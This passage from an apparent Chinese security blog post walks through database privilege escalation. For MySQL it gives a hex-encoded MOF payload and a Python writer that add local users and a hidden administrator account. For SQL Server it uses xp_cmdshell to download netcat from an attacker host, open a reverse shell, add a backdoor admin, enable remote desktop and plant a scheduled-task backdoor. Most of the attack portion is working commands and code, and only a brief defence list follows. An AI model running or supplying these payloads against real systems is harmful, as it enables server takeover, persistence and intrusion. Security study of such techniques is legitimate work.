class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在添加用户之后，还需要将用户加入本地管理员组，将脚本中的<code>net.exe user L1uxsn admin123 /add\</code>换成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators L1uxsn /add</span><br></pre></td></tr></table></figure>
+
+
+
+<p>脚本文件的上传思路与udf提权类似，大概三种：</p>
+<ul>
+<li><p>直接上传然后dumpfile</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:/test.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>直接将脚本的16进制编码dumpfile</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x23707261676d61206e616d65737061636528225c5c5c5c2e5c5c726f6f745c5c737562736372697074696f6e2229200a696e7374616e6365206f66205f5f4576656e7446696c74657220617320244576656e7446696c746572200a7b200a202020204576656e744e616d657370616365203d2022526f6f745c5c43696d7632223b200a202020204e616d6520203d202266696c745032223b200a202020205175657279203d202253656c656374202a2046726f6d205f5f496e7374616e63654d6f64696669636174696f6e4576656e742022200a20202020202020202020202022576865726520546172676574496e7374616e636520497361205c2257696e33325f4c6f63616c54696d655c222022200a20202020202020202020202022416e6420546172676574496e7374616e63652e5365636f6e64203d2035223b200a2020202051756572794c616e6775616765203d202257514c223b200a7d3b200a0a696e7374616e6365206f66204163746976655363726970744576656e74436f6e73756d65722061732024436f6e73756d6572200a7b200a202020204e616d65203d2022636f6e735043535632223b200a20202020536372697074696e67456e67696e65203d20224a536372697074223b200a2020202053637269707454657874203d200a202020202276617220575348203d206e657720416374697665584f626a656374285c22575363726970742e5368656c6c5c22295c6e5753482e72756e285c226e65742e65786520757365722061646d696e2061646d696e202f6164645c2229223b200a7d3b200a0a696e7374616e6365206f66205f5f46696c746572546f436f6e73756d657242696e64696e67200a7b200a20202020436f6e73756d65722020203d2024436f6e73756d65723b200a2020202046696c746572203d20244576656e7446696c7465723b200a7d3b into dumpfile &#x27;C:/windows/system32/wbem/mof/nullevt.mof&#x27;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数据库允许远程链接的情况下可以使用py写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"></span><br><span class="line">conn=MySQLdb.connect(host=<span class="string">&quot;192.168.111.6&quot;</span>,user=<span class="string">&quot;root&quot;</span>,passwd=<span class="string">&quot;root&quot;</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span></span><br><span class="line"><span class="string">instance of __EventFilter as $EventFilter</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> EventNamespace = &quot;Root\\Cimv2&quot;;</span></span><br><span class="line"><span class="string"> Name = &quot;filtP2&quot;;</span></span><br><span class="line"><span class="string"> Query = &quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line"><span class="string"> &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span></span><br><span class="line"><span class="string"> &quot;And TargetInstance.Second = 5&quot;;</span></span><br><span class="line"><span class="string"> QueryLanguage = &quot;WQL&quot;;</span></span><br><span class="line"><span class="string"> &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">instance of ActiveScriptEventConsumer as $Consumer</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> Name = &quot;consPCSV2&quot;;</span></span><br><span class="line"><span class="string"> ScriptingEngine = &quot;JScript&quot;;</span></span><br><span class="line"><span class="string"> ScriptText =</span></span><br><span class="line"><span class="string"> &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user xxxx xxx /add\&quot;)&quot;;</span></span><br><span class="line"><span class="string"> &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">instance of __FilterToConsumerBinding</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> Consumer = $Consumer;</span></span><br><span class="line"><span class="string"> Filter = $EventFilter;</span></span><br><span class="line"><span class="string"> &#125;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ascii_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each_chr <span class="keyword">in</span> payload:</span><br><span class="line">    ascii_payload += <span class="built_in">str</span>(<span class="built_in">ord</span>(each_chr)) + <span class="string">&#x27;,&#x27;</span></span><br><span class="line"></span><br><span class="line">ascii_payload = ascii_payload[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">cur = conn.cursor()</span><br><span class="line">sql = <span class="string">&quot;select char(%s) into dumpfile &#x27;C:/windows/system32/wbem/mof/nullevt.mof&#x27;&quot;</span> % ascii_payload</span><br><span class="line"></span><br><span class="line">cur.execute(sql)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>注意:</p>
+<p>服务器会每五秒会循环执行之前的mof文件中的内容，在服务器被mof提权后，需要解决系统继续运行恶意代码的问题：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line"><span class="comment">#停止winmgmt服务</span></span><br><span class="line"><span class="built_in">rmdir</span> /q /s c:\windows\system32\wbem\repository</span><br><span class="line"><span class="comment">#删除存储库备份</span></span><br><span class="line"><span class="built_in">del</span> /f /s c:\windows\system32\wbem\mof\good\nullevt.mof</span><br><span class="line"><span class="comment">#删除mof文件</span></span><br><span class="line">net <span class="built_in">start</span> winmgmt</span><br><span class="line"><span class="comment">#重启winmgmt服务</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>工具使用:</strong></p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/11.png"></p>
+<p>同样的连接目标数据库</p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/12.png"></p>
+<p>进入后可直接执行命令，例如这里输入<code>net user cong$ 12456 /add &amp; net localgroup administrators cong$ /add </code>  (创建一个隐藏管理员用户，创建成功后即使原来的入口，如Webshell、MySQL连接被修复，仍然可以通过这个隐藏用户重新进入系统。这是权限维持的常用手段)</p>
+<table>
+<thead>
+<tr>
+<th align="left">部分</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>net user cong$ 12456 /add</code></td>
+<td align="left">创建一个用户名为 <code>cong$</code>，密码为 <code>12456</code> 的本地用户</td>
+</tr>
+<tr>
+<td align="left"><code>&amp;</code></td>
+<td align="left">连接符，前一条命令执行完后接着执行后面的命令</td>
+</tr>
+<tr>
+<td align="left"><code>net localgroup administrators cong$ /add</code></td>
+<td align="left">将 <code>cong$</code> 用户添加到 <code>Administrators</code>（管理员组）</td>
+</tr>
+</tbody></table>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/13.png"></p>
+<p>执行成功后在mof目录下发现导出成功的system.mof文件</p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/14.png"></p>
+<ul>
+<li>如果 MOF 文件在 <code>good</code> 文件夹 → 执行成功</li>
+<li>如果 MOF 文件在 <code>bad</code> 文件夹 → 执行失败（格式错误或系统不支持）</li>
+<li>如果 <code>system.mof</code> 还留在原目录 → 没有被处理（WMI 服务问题或系统不支持）</li>
+</ul>
+<p>隐藏用户的利用:</p>
+<table>
+<thead>
+<tr>
+<th align="left">利用方式</th>
+<th align="left">适用场景</th>
+<th align="left">命令&#x2F;操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>远程桌面登录</strong></td>
+<td align="left">Windows Server（开启了3389端口）</td>
+<td align="left"><code>mstsc</code> 输入 <code>cong$</code> + 密码登录</td>
+</tr>
+<tr>
+<td align="left"><strong>IPC$ 空会话连接</strong></td>
+<td align="left">Windows主机（135、445端口开放）</td>
+<td align="left"><code>net use \\目标IP\ipc$ &quot;12456&quot; /user:&quot;cong$&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>PsExec 远程执行</strong></td>
+<td align="left">Windows主机，管理员权限</td>
+<td align="left"><code>psexec \\目标IP -u cong$ -p 12456 cmd</code></td>
+</tr>
+<tr>
+<td align="left"><strong>计划任务创建</strong></td>
+<td align="left">需要定时执行命令</td>
+<td align="left"><code>schtasks /create /s 目标IP /u cong$ /p 12456 ...</code></td>
+</tr>
+<tr>
+<td align="left"><strong>WMI 远程控制</strong></td>
+<td align="left">Windows主机</td>
+<td align="left"><code>wmic /node:目标IP /user:cong$ /password:12456 process call create &quot;cmd.exe&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>SMB 文件共享访问</strong></td>
+<td align="left">需要访问共享文件</td>
+<td align="left"><code>net use Z: \\目标IP\share /user:cong$ 12456</code></td>
+</tr>
+</tbody></table>
+<h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><p>从上面提到的提权过程可以知道，这些权限提升基本都是mysql的配置不当导致的，因此，可以有如下防御措施：</p>
+<ul>
+<li>降低数据库服务启动用户的权限</li>
+<li>如果非必要，可以删除插件目录或限制插件目录的权限</li>
+<li>正确配置secure_file_priv变量</li>
+</ul>
+<h2 id="SQL-server提权"><a href="#SQL-server提权" class="headerlink" title="SQL server提权"></a>SQL server提权</h2><p><strong>常见的 SQL Server 提权方式</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">方式</th>
+<th align="left">原理</th>
+<th align="left">关键条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>存储过程执行命令</strong></td>
+<td align="left">利用 <code>xp_cmdshell</code>、<code>xp_regwrite</code> 等高危存储过程执行系统命令。</td>
+<td align="left">SQL Server 服务账户（如 <code>NT SERVICE\MSSQLSERVER</code>）需要有较高权限；<code>xp_cmdshell</code> 通常默认禁用，但可能被管理员误开启。</td>
+</tr>
+<tr>
+<td align="left"><strong>CLR 程序集</strong></td>
+<td align="left">上传并执行 C# 等编写的 .NET 代码（CLR 程序集），运行系统命令。</td>
+<td align="left">需要 <code>sysadmin</code> 权限开启 CLR；SQL Server 2017+ 默认禁用。</td>
+</tr>
+<tr>
+<td align="left"><strong>代理作业 (SQL Agent Job)</strong></td>
+<td align="left">创建 SQL Server Agent 作业，以服务账户权限执行命令。</td>
+<td align="left">SQL Server Agent 服务正在运行；用户有创建作业的权限。</td>
+</tr>
+<tr>
+<td align="left"><strong>OLE 自动化</strong></td>
+<td align="left">利用 <code>sp_OACreate</code>、<code>sp_OAMethod</code> 等存储过程创建 COM 对象（如 <code>WScript.Shell</code>）执行命令。</td>
+<td align="left">相关存储过程默认禁用，需手动开启。</td>
+</tr>
+<tr>
+<td align="left"><strong>沙盒模式绕过</strong></td>
+<td align="left">利用 Access 链接服务器或 Jet 引擎的沙盒模式配置缺陷执行任意代码。</td>
+<td align="left">通常出现在较旧版本（2000、2005）或配置不当的环境。</td>
+</tr>
+<tr>
+<td align="left"><strong>数据库链接服务器</strong></td>
+<td align="left">通过已配置的链接服务器，跳转到其他更高权限的数据库实例。</td>
+<td align="left">存在链接到高权限服务器的配置。</td>
+</tr>
+</tbody></table>
+<p><strong>条件:</strong></p>
+<ol>
+<li>服务器开启数据库服务</li>
+<li>获取到最高权限用户密码<br>(除Access数据库外，其他数据库基本都存在数据库提权的可能)</li>
+</ol>
+<h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>简介:<code>xp_cmdshell</code> 是 SQL Server 中一个<strong>扩展存储过程</strong>，它的全称是 <strong>Extended Procedure for Command Shell</strong>。它的核心功能只有一个：<strong>允许 T-SQL 语句直接执行 Windows 操作系统的命令</strong>。</p>
+<p>简单来说，就是让你在 SQL Server 的查询窗口里，像在 CMD 命令行里一样，运行 <code>ipconfig</code>、<code>whoami</code>、<code>net user</code> 等任何系统命令</p>
+<p>查看 xp_cmdshell 状态: <code>EXEC sp_configure &#39;xp_cmdshell&#39;;</code></p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/15.png"></p>
+<table>
+<thead>
+<tr>
+<th align="left">列名</th>
+<th align="left">值</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>name</code></td>
+<td align="left">xp_cmdshell</td>
+<td align="left">配置项名称</td>
+</tr>
+<tr>
+<td align="left"><code>minimum</code></td>
+<td align="left">0</td>
+<td align="left">最小值可以是0</td>
+</tr>
+<tr>
+<td align="left"><code>maximum</code></td>
+<td align="left">1</td>
+<td align="left">最大值只能是1（开关型配置）</td>
+</tr>
+<tr>
+<td align="left"><strong><code>config_value</code></strong></td>
+<td align="left"><strong>1</strong></td>
+<td align="left"><strong>当前设置的值</strong>（你配置成什么）</td>
+</tr>
+<tr>
+<td align="left"><strong><code>run_value</code></strong></td>
+<td align="left"><strong>1</strong></td>
+<td align="left"><strong>当前正在运行的值</strong>（实际生效的值）</td>
+</tr>
+</tbody></table>
+<p><strong>具体利用步骤:</strong></p>
+<ul>
+<li>1.探测是否有权限开启&#x2F;使用 xp_cmdshell</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. 检查当前用户是否为 sysadmin</span></span><br><span class="line"><span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 如果返回 1，检查 xp_cmdshell 当前状态</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 如果值为 0，尝试开启（需要sysadmin权限）</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">sp_configure：这是 <span class="keyword">SQL</span> Server 用来管理配置选项的一个系统存储过程。</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> advanced options：这是一个“总开关”。在 <span class="keyword">SQL</span> Server 里，很多配置选项默认是隐藏的，防止被随意修改。只有把这个选项设为 <span class="number">1</span>（开启），我们才能看到并修改那些高级设置。</span><br><span class="line"></span><br><span class="line">RECONFIGURE：这条指令告诉 <span class="keyword">SQL</span> Server，“让刚才的配置修改立刻生效”。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/16.png"></p>
+<ul>
+<li>2.执行系统命令（信息收集）</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 收集服务器基本信息</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;                    <span class="comment">-- 当前用户</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;hostname&#x27;</span>;                  <span class="comment">-- 计算机名</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;ipconfig /all&#x27;</span>;             <span class="comment">-- 网络配置</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;systeminfo&#x27;</span>;                <span class="comment">-- 系统详细信息</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;tasklist&#x27;</span>;                  <span class="comment">-- 正在运行的进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 收集SQL Server信息</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;sqlcmd -Q &quot;SELECT @@VERSION&quot;&#x27;</span>;  <span class="comment">-- 数据库版本</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/17.png"></p>
+<p>如图，这里利用了xp_cmdshell查询了计算机名和网络配置信息</p>
+<ul>
+<li><p>3.上传工具或建立后门</p>
+<p>如果服务账户有写权限，攻击者可以：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 下载恶意程序（使用certutil或bitsadmin）</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;certutil -urlcache -f http://攻击者IP/nc.exe C:\temp\nc.exe&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行反弹shell</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;C:\temp\nc.exe 攻击者IP 4444 -e cmd.exe&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加用户（如果权限够）</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;net user backdoor P@ssw0rd /add&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;net localgroup administrators backdoor /add&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 开启远程桌面</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建计划任务持久化</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;schtasks /create /tn &quot;SystemCheck&quot; /tr &quot;C:\temp\backdoor.exe&quot; /sc daily /st 09:00 /f&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>反弹shell具体释义:</strong></p>
+<p><code>C:\temp\nc.exe 192.168.134.128 4444 -e cmd.exe</code> </p>
+<table>
+<thead>
+<tr>
+<th align="left">部分</th>
+<th align="left">含义</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>C:\temp\nc.exe</code></td>
+<td align="left"><strong>工具</strong> (Netcat)</td>
+<td align="left">这是一个网络工具，像一根“网线”，负责在网络上发送和接收数据。</td>
+</tr>
+<tr>
+<td align="left"><code>192.168.134.128</code></td>
+<td align="left"><strong>攻击者的IP地址</strong></td>
+<td align="left">这是你要连接的“目的地”，也就是你的Kali Linux电脑。</td>
+</tr>
+<tr>
+<td align="left"><code>4444</code></td>
+<td align="left"><strong>端口号</strong></td>
+<td align="left">这像一扇“门”。攻击者的电脑必须在这扇“门”上等着，连接才能成功。</td>
+</tr>
+<tr>
+<td align="left"><code>-e</code></td>
+<td align="left"><strong>参数</strong></td>
+<td align="left">这是Netcat的一个关键选项，意思是“执行” (execute)。</td>
+</tr>
+<tr>
+<td align="left"><code>cmd.exe</code></td>
+<td align="left"><strong>程序</strong></td>
+<td align="left">这是Windows的<strong>命令解释器</strong>，也就是我们常说的“黑框框”命令行。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.目标服务器上是没有C:\temp\nc.exe这个文件的，所以要利用这个命令就先要在自己的kali上面开启python服务 (python3 -m http.server 80)</span><br><span class="line"></span><br><span class="line">2.利用xp_cmdshell下载nc.exe这个文件(EXEC xp_cmdshell &#x27;certutil -urlcache -f http://192.168.134.128/nc.exe </span><br><span class="line">C:\Users\Public\nc.exe&#x27;;)</span><br><span class="line"></span><br><span class="line">3.再在kali上面监听端口(nc -lvp 4444)</span><br><span class="line"></span><br><span class="line">4.最后利用xp_cmdshell进行反弹shell (EXEC xp_cmdshell &#x27;cmd /c C:\temp\nc.exe -e cmd.exe 192.168.134.128 4444&#x27;;)</span><br><span class="line"></span><br><span class="line">注:进行连接时要把kali的防火墙关掉，不然连不上(sudo ufw disable)，重新开启(sudo ufw enable)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/18.png"></p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/19.png"></p>
+<p>(这里可以看到已经连接上了我的mssqlserver数据库上了)</p>
+<p><strong>注:Kali Linux 预装了Windows版本的 <code>nc.exe</code>，路径是：<code>/usr/share/windows-binaries/nc.exe</code></strong></p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/20.png"></p>
+<p>攻击思路一般是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL注入点 → 判断权限是否为sysadmin → 开启xp_cmdshell → 执行系统命令 → 控制服务器</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/07/17/sql提权/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">sql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.</span> <span class="toc-text">UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mof%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.2.</span> <span class="toc-text">mof提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="toc-number">1.1.3.</span> <span class="toc-text">防御手段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-server%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">SQL server提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-number">1.2.1.</span> <span class="toc-text">xp_cmdshell</span></a></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2026/07/17/SSRF/">SSRF</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/07/17/python原型链污染/">python原型链污染</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2026/07/17/sql提权/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      从何时开始忌讳空山无人,从何时开始怕遥望星辰 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"任我行","artist":"eason","url":"https://y.qq.com/n/ryqq_v2/player","cover":"https://y.qq.com/n/ryqq_v2/player"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
